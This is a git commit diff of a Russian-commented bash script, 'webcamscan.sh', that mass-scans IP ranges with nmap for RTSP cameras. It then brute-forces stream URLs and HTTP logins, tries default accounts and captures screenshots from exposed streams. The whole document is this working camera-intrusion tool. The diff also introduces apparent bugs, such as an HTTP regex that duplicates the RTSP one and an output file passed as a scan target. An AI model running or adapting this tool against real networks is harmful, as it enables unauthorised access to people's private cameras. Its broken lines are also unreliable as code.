f3f92d417797d07d8cd59d4bfde01b3badc9846b
voaoom <xstefmail@gmail.com>
2015-10-13 11:59:37 +0700

    Еще

--- webcamscan.sh
+++ webcamscan.sh
@@ -1,14 +1,10 @@
 #!/bin/bash
 #
-if [[ $EUID -ne 0 ]]; then
-   echo "Скрипт должен работать от root."
-   exit 1
-fi
-if [ ! -f "$1" ]; then
-	echo "Файл '$1' не найден!"
-	exit 1
-fi
+# Базовые проверки
+[[ $EUID -ne 0 ]] && echo "Скрипт должен работать от root." && exit 1
+[[ ! -f "$1" ]] && echo "Файл '$1' не найден!" && exit 1
 #
+# Загружаем настройки
 . "$(dirname $0)/config.sh"
 NMAPDIR="${NMAPDIR:-.}"
 WRITE_ALL_HOSTS="${WRITE_ALL_HOSTS:-true}"
@@ -21,8 +17,23 @@ LIBAV_LIMIT="${LIBAV_LIMIT:-4}"
 LIBAV_SCREENSHOT="${LIBAV_SCREENSHOT:-true}"
 CLEANUP="${CLEANUP:-true}"
 #
-IPREGEX='[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'
-RTSPREGEX='rtsp:\/\/[0-9.]\+\/\S*'
+# 'Константные' регексы
+REGEX_IP='[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'
+REGEX_URL_RSTP='rtsp:\/\/[0-9.]\+\/\S*'
+REGEX_URL_HTTP='rtsp:\/\/[0-9.]\+\/\S*'
+#
+# Рабочие переменные окружения
+OUT="${OUT:-$1-webcam}"
+mkdir -p "$OUT"
+TMP="${TMP:-$OUT/tmp}"
+mkdir -p "$TMP"
+SCRIPTS_ARGS="$TMP/script-args.tmp"
+DISCOVERED1="$TMP/discovered.1.tmp"
+DISCOVERED2="$TMP/discovered.2.tmp"
+STAGE1="$TMP/stage.1.tmp"
+STAGE2="$TMP/stage.2.tmp"
+STAGE3="$TMP/stage.3.tmp"
+STAGE4="$TMP/stage.4.tmp"
 #
 # $1 - позиция, $2 - максимум.
 function f_echo_progress () { echo -n " $(bc -l <<< "scale=1; 100.0*($1-0.5)/$2")%" ; }
@@ -30,6 +41,7 @@ function f_echo_subprogress () { echo -n '.' ; }
 #
 # Исправляет владельца файла из-за выполенния от root'а: $1 - файл
 function f_fix_own () {
+	# Не уверен, что это правильно.
 	local u=$(who am i | awk '{print $1}')
 	chown -R "$u:$u" "$1"
 }
@@ -44,13 +56,14 @@ function f_iterate_file () {
 		f_echo_progress "$(( i++ ))" "$n"
 		$@ "$item" #INVOKE CALLBACK
 	done < "$file"
+	echo # NL после прогресса
 }
 #
 # Первичное сканирование целей: $1 - куда сохранять, $2 - цели 
 function f_scan () {
 	nmap --privileged -n -sS -sU -p T:554,U:554 --open --max-retries 3 --host-timeout 30s \
 		--randomize-hosts --min-parallelism=4 --min-hostgroup=4096 --max-hostgroup=65536 \
-		-oG - "$2" | grep 'open/' | grep -o "$IPREGEX" | uniq >> "$1"
+		-oG - "$2" | grep 'open/' | grep -o "$REGEX_IP" | uniq >> "$1"
 }
 #
 # Записывает найденые хосты в выход: $1 - файл с хостами
@@ -66,7 +79,7 @@ function f_deep_scan_host () {
 	# 81,8008,8081 - Beward MJPG
 	nmap -vvv --privileged -T4 -n -PN -sS -sU -p T:80,T:81,T:8008,T:8080,T:8081,T:554,U:554 --reason \
 		--script "$SCRIPTS" --script-args "$SCRIPTS_ARGS" \
-		--host-timeout "$HOST_TIMELIMIT" "$1" -oN "$STAGE3" > /dev/null 2>&1
+		--host-timeout "$HOST_TIMELIMIT" "$1" "$STAGE3" > "$STAGE3"
 	F=''
 	if grep -q 'Valid credentials' "$STAGE3" ; then F="${F}_creds" ; fi # Флаг: Найден логин-пароль
 	if grep -q 'No valid accounts found' "$STAGE3" ; then F="${F}_nocreds" ; fi # Флаг: Не найден логин-пароль
@@ -74,7 +87,7 @@ function f_deep_scan_host () {
 		F="${F}_rtsp" # Флаг: Есть рабочие стримы
 		echo ' ' >> "$STAGE4"
 		M=0
-		for item3 in `grep -o "$RTSPREGEX" "$STAGE3"` ; do
+		for item3 in `grep -o "$REGEX_URL_RSTP" "$STAGE3"` ; do
 			if [ "$M" -ge "$LIBAV_LIMIT" ] ; then
 				echo "Достигнут LIBAV_LIMIT ($LIBAV_LIMIT)!" >> "$STAGE4"
 				break
@@ -103,18 +116,6 @@ function f_deep_scan_host () {
 	f_fix_own "$INFOFILE"
 }
 #
-OUT="${OUT:-$1-webcam}"
-mkdir -p "$OUT"
-TMP="${TMP:-$OUT/tmp}"
-mkdir -p "$TMP"
-SCRIPTS_ARGS="$TMP/script-args.tmp"
-DISCOVERED1="$TMP/discovered.1.tmp"
-DISCOVERED2="$TMP/discovered.2.tmp"
-STAGE1="$TMP/stage.1.tmp"
-STAGE2="$TMP/stage.2.tmp"
-STAGE3="$TMP/stage.3.tmp"
-STAGE4="$TMP/stage.4.tmp"
-#
 echo "Первый этап: Поиск..."
 rm -f "$DISCOVERED1"
 f_iterate_file "$1" f_scan "$DISCOVERED1"
@@ -125,16 +126,13 @@ echo "Найдено $(wc -l < "$DISCOVERED2") потенциальных кам
 #
 echo "Второй этап: Расширенное сканирование..."
 SCRIPTS='rtsp-methods,rtsp-url-brute,http-title'
-if [ "$BRUTEFORCE" = 'true' ] ; then
-	SCRIPTS="$SCRIPTS,http-auth,http-auth-finder,http-brute,http-form-brute,http-default-accounts"
-fi
+[[ "$BRUTEFORCE" = 'true' ]] && SCRIPTS="$SCRIPTS,http-auth,http-auth-finder,http-brute,http-form-brute,http-default-accounts"
 SCRIPTS_ARGS="unpwdb.timelimit='$BRUTEFORCE_TIMELIMIT'"
 SCRIPTS_ARGS="$SCRIPTS_ARGS,rtsp-url-brute.urlfile='$RTSP_URLS'"
 SCRIPTS_ARGS="$SCRIPTS_ARGS,brute.retries=10240,http-auth.path='/',http-form-brute.path='/',http-brute.path='/'"
 
 f_iterate_file "$DISCOVERED2" f_deep_scan_host 
 
-echo " "
 [[ "$CLEANUP" = 'true' ]] && rm -rf "$TMP"
 f_fix_own "$OUT"
 #
